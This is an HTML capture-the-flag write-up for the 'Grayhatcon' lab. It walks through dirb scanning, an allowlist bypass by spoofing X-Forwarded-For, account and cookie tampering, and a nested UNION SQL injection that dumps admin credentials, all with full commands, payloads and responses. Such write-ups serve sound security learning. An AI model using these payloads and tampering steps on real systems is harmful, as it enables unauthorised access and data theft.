@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>Grayhatcon</title>
+  <style>
+      code{white-space: pre-wrap;}
+      span.smallcaps{font-variant: small-caps;}
+      span.underline{text-decoration: underline;}
+      div.column{display: inline-block; vertical-align: top; width: 50%;}
+  </style>
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+    <head>
+      <link rel="stylesheet" type="text/css" href="../../css/global.css"></link>
+      <script type="text/javascript" src="../../js/common.js"></script>
+    </head>
+</head>
+<body>
+    <div id="header"><a class="header" href="../../index.html">[]|\|[-/-\|_/\/\[]|\||)</a></div>
+    <div id="content" class="content" style="width:70%;height:auto">
+<header id="title-block-header">
+<h1 class="title">Grayhatcon</h1>
+</header>
+<h2 id="flag-1">Flag 1</h2>
+<p>Try to guess the path, in <code>robots.txt</code></p>
+<pre><code>User-agent: *
+Disallow: s3cr3t-4dm1n/</code></pre>
+<p>But it gives a <code>403</code> response while accessing <code>s3cr3t-4dm1n</code>. Try to scan any subpath in <code>s3cr3t-4dm1n/</code> with <code>dirb</code>.</p>
+<pre><code>dirb http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n ../dirb222/wordlists/common.txt</code></pre>
+<pre><code>---- Scanning URL: http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/ ----                                                                                       
++ http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/.htaccess (CODE:200|SIZE:69)
+...</code></pre>
+<p>Now we have an accessible path <code>.htaccess</code>. Request the file it with <code>httpie</code>.</p>
+<pre><code>http -v http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/.htaccess
+
+GET /c9c213fc7b/s3cr3t-4dm1n/.htaccess HTTP/1.1
+User-Agent: HTTPie/1.0.3
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Host: 35.227.24.107
+
+
+
+HTTP/1.1 200 OK
+Server: nginx/1.14.0 (Ubuntu)
+Date: Mon, 29 Mar 2021 06:16:00 GMT
+Content-Type: plain/text
+Transfer-Encoding: chunked
+Connection: keep-alive
+Content-disposition: attachment; filename=.htaccess
+
+Order Deny,Allow
+Deny from all
+Allow from 8.8.8.8
+Allow from 8.8.4.4</code></pre>
+<p>Allowed IPs are <code>8.8.8.8</code> and <code>8.8.4.4</code>. Now try to request <code>s3cr3t-4dmin</code> again with one of these IPs.</p>
+<pre><code>http -v GET http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/ X-Forwarded-For:8.8.8.8</code></pre>
+<p>In response there is one flag and admin login form.</p>
+<h2 id="flag-2">Flag 2</h2>
+<p>Register a user account and login with it, there are four options in dashboard. Switch to subusers, it allows us to register subuser under current user account. The request needs three parameters, <code>owner_hash</code>, <code>new_username</code> and <code>new_password</code>. It’s slightly different from register form at home page, try to request a new account with <code>owner_hash</code> parameter and the value is account hash of user <code>hunter2</code>. Account hash of user <code>hunter2</code> is located in a hidden field in password reset page.</p>
+<pre><code>http -v --form POST http://35.227.24.107/c9c213fc7b/register owner_hash=cf505baebbaf25a0a4c63eb93331eb36 new_username=888 new_password=onetwo</code></pre>
+<p>Now the new user <code>888</code> has been created, login with it, the account is still awaiting activation, but we get the second flag.</p>
+<h2 id="flag-3">Flag 3</h2>
+<p>To activate user <code>888</code>, we need to login as another user <code>one</code> to use the subuser enable function, but change the subuser hash to <code>888</code>’s account hash and <code>userhash</code> in cookie to <code>hunter2</code>’s account hash.</p>
+<pre><code>http -v --form POST http://35.227.24.107/c9c213fc7b/dashboard/subusers \
+  &quot;Cookie:token=MzY4MGM4Nzg5YTQzMTEwYzc4MmZjZmNjZTg5ODJhYTc5NWUyZDU4OWZlZTNkMmFlZjliZDBlNjgwNjQ1ZGQzMDQ2YWYyZTAzYmU1Mzk3MzEzMjA1YTQxYzdkNDYwYWI3OTRjZGI4Y2UzODBmOTdmZWQ3MmExZjgyYWQwZGU2YjM%3D;userhash=cf505baebbaf25a0a4c63eb93331eb36&quot;\
+  hash=1997b46b3fea065fa085562a6a6dcc09\
+  enable_toggle=enable
+</code></pre>
+<p>After the previous step, logout user <code>one</code> and login as user <code>888</code>, the third flag is right under user details.</p>
+<h2 id="flag-4">Flag 4</h2>
+<p>In source code of <code>Your Auctions</code> section exists a subpath<code>auctions/questions</code>, it takes one parameter <code>id</code>, which is auction type id from <code>1</code> to <code>5</code>.</p>
+<pre><code>{&quot;name&quot;:&quot;Desktops&quot;,&quot;questions&quot;:[{&quot;question&quot;:&quot;Make&quot;,&quot;field_name&quot;:&quot;field_4728_186574&quot;},{&quot;question&quot;:&quot;Model&quot;,&quot;field_name&quot;:&quot;field_5738_281961&quot;},{&quot;question&quot;:&quot;RAM&quot;,&quot;field_name&quot;:&quot;field_5051_369408&quot;},{&quot;question&quot;:&quot;Processors&quot;,&quot;field_name&quot;:&quot;field_4032_347621&quot;}],&quot;auctions&quot;:[{&quot;id&quot;:&quot;1&quot;,&quot;title&quot;:&quot;Ultra Desktop&quot;},{&quot;id&quot;:&quot;9&quot;,&quot;title&quot;:&quot;Premium Desktop&quot;},{&quot;id&quot;:&quot;10&quot;,&quot;title&quot;:&quot;Work Station&quot;}]}</code></pre>
+<p>If we give it <code>id=0</code>, error message returns.</p>
+<pre><code>{&quot;error&quot;:&quot;Invalid auction type ID entered&quot;}</code></pre>
+<p>A normal response contains three fields, <code>name</code>, <code>questions</code> and <code>auctions</code>. Try to use <code>union</code> to guess some information out of it.</p>
+<pre><code>0 union select &#39;0 union select 1&#39;,2,&#39;[]&#39; --</code></pre>
+<p>Payload above give us the following response.</p>
+<pre><code>{&quot;name&quot;:&quot;[]&quot;,&quot;questions&quot;:[],&quot;auctions&quot;:[]}</code></pre>
+<p>Keep adding column numbers until something different shown.</p>
+<pre><code>0 union select &#39;0 union select 1,2,3,4,5,6,7,8,9&#39;,10,&#39;[]&#39; --</code></pre>
+<p>In response column <code>1</code> was taken as auction id, column <code>6</code> was taken as title and name was replaced by <code>10</code>.</p>
+<pre><code>{&quot;name&quot;:&quot;10&quot;,&quot;questions&quot;:[],&quot;auctions&quot;:[{&quot;id&quot;:&quot;1&quot;,&quot;title&quot;:&quot;6&quot;}]}</code></pre>
+<p>Now chage <code>1</code> to <code>table_name</code> to get table names from <code>information_schema</code>.</p>
+<pre><code>0 union select &#39;0 union select table_name,2,3,4,5,6,7,8,9 from information_schema.tables&#39;,10,&#39;[]&#39; --</code></pre>
+<p>In output, table <code>admin</code> and <code>auction</code> are interesting.</p>
+<pre><code>{&quot;name&quot;:&quot;10&quot;,&quot;questions&quot;:[],&quot;auctions&quot;:[{&quot;id&quot;:&quot;admin&quot;,&quot;title&quot;:&quot;6&quot;},{&quot;id&quot;:&quot;auction&quot;,&quot;title&quot;:&quot;6&quot;},
+{&quot;id&quot;:&quot;ALL_PLUGINS&quot;,&quot;title&quot;:&quot;6&quot;},{&quot;id&quot;:&quot;APPLICABLE_ROLES&quot;,&quot;title&quot;:&quot;6&quot;},
+{&quot;id&quot;:&quot;CHARACTER_SETS&quot;,&quot;title&quot;:&quot;6&quot;},{&quot;id&quot;:&quot;COLLATIONS&quot;,&quot;title&quot;:&quot;6&quot;},
+{&quot;id&quot;:&quot;COLLATION_CHARACTER_SET_APPLICABILITY&quot;,&quot;title&quot;:&quot;6&quot;},
+{&quot;id&quot;:&quot;COLUMNS&quot;,&quot;title&quot;:&quot;6&quot;},
+{&quot;id&quot;:&quot;COLUMN_PRIVILEGES&quot;,&quot;title&quot;:&quot;6&quot;},
+{&quot;id&quot;:&quot;ENABLED_ROLES&quot;,&quot;title&quot;:&quot;6&quot;},
+{&quot;id&quot;:&quot;ENGINES&quot;,&quot;title&quot;:&quot;6&quot;},
+{&quot;id&quot;:&quot;EVENTS&quot;,&quot;title&quot;:&quot;6&quot;},
+{&quot;id&quot;:&quot;FILES&quot;,&quot;title&quot;:&quot;6&quot;},
+...</code></pre>
+<p>Try to list columns in table <code>admin</code>.</p>
+<pre><code>0 union select &#39;0 union select COLUMN_NAME,2,3,4,5,6,7,8,9 from INFORMATION_SCHEMA.COLUMNS where table_name=&quot;admin&quot;&#39;,10,&#39;[]&#39; --</code></pre>
+<pre><code>{&quot;name&quot;:&quot;10&quot;,&quot;questions&quot;:[],&quot;auctions&quot;:[{&quot;id&quot;:&quot;id&quot;,&quot;title&quot;:&quot;6&quot;},{&quot;id&quot;:&quot;username&quot;,&quot;title&quot;:&quot;6&quot;},{&quot;id&quot;:&quot;password&quot;,&quot;title&quot;:&quot;6&quot;}]}</code></pre>
+<p>Now we know there are three columns in the table, try to fetch <code>username</code> and <code>password</code> from it, replace column <code>1</code> with <code>username</code> and column <code>6</code> with <code>password</code>.</p>
+<pre><code>0 union select &#39;0 union select username,2,3,4,5,password,7,8,9 from admin&#39;,10,&#39;[]&#39; --</code></pre>
+<pre><code>{&quot;name&quot;:&quot;10&quot;,&quot;questions&quot;:[],&quot;auctions&quot;:[{&quot;id&quot;:&quot;h4ckerbayadmin&quot;,&quot;title&quot;:&quot;auction$rFun!&quot;}]}</code></pre>
+<p>So the username is <code>h4ckerbayadmin</code> and password is <code>auction$rFun!</code>.</p>
+<p>Remember the admin login page we get before? Now login with correct credential.</p>
+<pre><code>http -v --form POST http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/ \
+  X-Forwarded-For:8.8.8.8 \
+  username=h4ckerbayadmin \
+  password=&quot;auction\$rFun!&quot; </code></pre>
+<p>Access admin page with received token.</p>
+<pre><code>http -v GET http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/\
+  X-Forwarded-For:8.8.8.8 \
+  Cookie:admin-token=DF120B994C5FD4377A42F55D086F6EF7</code></pre>
+<p>Input the auction hash shown in <code>dashboard/auctions</code> page while login as <code>888</code>.</p>
+<pre><code>http -v --form POST http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/\
+  X-Forwarded-For:8.8.8.8 \
+  Cookie:admin-token=DF120B994C5FD4377A42F55D086F6EF7 \
+  auction_hash=8ylbbgs2</code></pre>
+<p>Delete it with <code>action=delete</code></p>
+<pre><code>http -v --form POST http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/ \
+  X-Forwarded-For:8.8.8.8 \
+  Cookie:admin-token=DF120B994C5FD4377A42F55D086F6EF7 \
+  auction_hash=8ylbbgs2 \
+  action=delete</code></pre>
+<p>The last flag is in response.</p>
+    </div>
+    <a id="back-to-top" class="back-to-top" href="#header">TOP</a>
+</body>
+</html>
